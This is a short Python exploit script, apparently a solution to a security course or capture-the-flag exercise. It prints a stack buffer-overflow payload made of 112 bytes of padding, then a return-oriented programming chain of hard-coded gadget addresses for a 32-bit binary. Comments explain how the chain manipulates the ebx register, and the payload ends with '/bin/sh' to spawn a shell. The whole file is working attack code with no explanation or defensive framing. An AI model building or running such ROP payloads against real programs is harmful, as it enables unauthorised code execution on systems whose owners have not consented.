from shellcode import shellcode
import sys



sys.stdout.buffer.write(
    b'AAAA'*28                                      +
    (0x080563d0.to_bytes(4, 'little')               +
    0x0805e8ad.to_bytes(4, "little") * 23)          +
    0x080481d1.to_bytes(4, "little")                + # reset ebx to 0
    0xffffffff.to_bytes(4, "little")                + # set ebx to max
    0x0805e27b.to_bytes(4, "little")                + # overflow by 1 so it wraps around to 0
    0x080732cf.to_bytes(4, 'little')                +
    (0x08096740.to_bytes(4, 'little')               +
    (0x0805e8ad.to_bytes(4, 'little') * 4))         +
    0x080481d1.to_bytes(4, 'little')                +
    0xfff6cd0c.to_bytes(4, 'little')                +
    0x08056485.to_bytes(4, 'little')                +
    0x0806f13c.to_bytes(4, 'little')                +
    0x0805e085.to_bytes(4, 'little')                +
    0x08094141.to_bytes(4, 'little')                +
    0x080732d0.to_bytes(4, 'little')                +
    b"/bin/sh"
                        )

